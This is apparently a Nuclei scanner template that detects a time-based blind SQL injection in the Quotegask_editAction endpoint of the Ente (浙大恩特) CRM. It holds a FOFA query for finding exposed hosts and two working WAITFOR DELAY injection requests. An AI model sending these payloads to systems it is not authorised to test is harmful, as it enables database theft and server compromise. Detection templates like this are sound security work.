id: zhedaente-Quotegask_editAction-sql

info:
  name: 浙大恩特客户资源管理系统 Quotegask_editAction SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="script/Ent.base.js"
    浙大恩特客户资源管理系统 Quotegask_editAction 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488306&idx=1&sn=18c46dcdc76deba5e3b03d212a80459a&chksm=c267a601f5102f17dc9e8662006b9395b8b947cb3a9bfb2044fbe0201215f09c58bccdc4494e&token=377357801&lang=zh_CN#rd
  tags: sql injection



http:
  - raw:
      - |
        GET /entsoft/Quotegask_editAction.entweb;.js?goonumStr=1');WAITFOR+DELAY+'0:0:4'--&method=goonumIsExist HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

      - |
        GET /entsoft/Quotegask_editAction.entweb;.js?goonumStr=1');WAITFOR+DELAY+'0:0:8'--&method=goonumIsExist HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and  






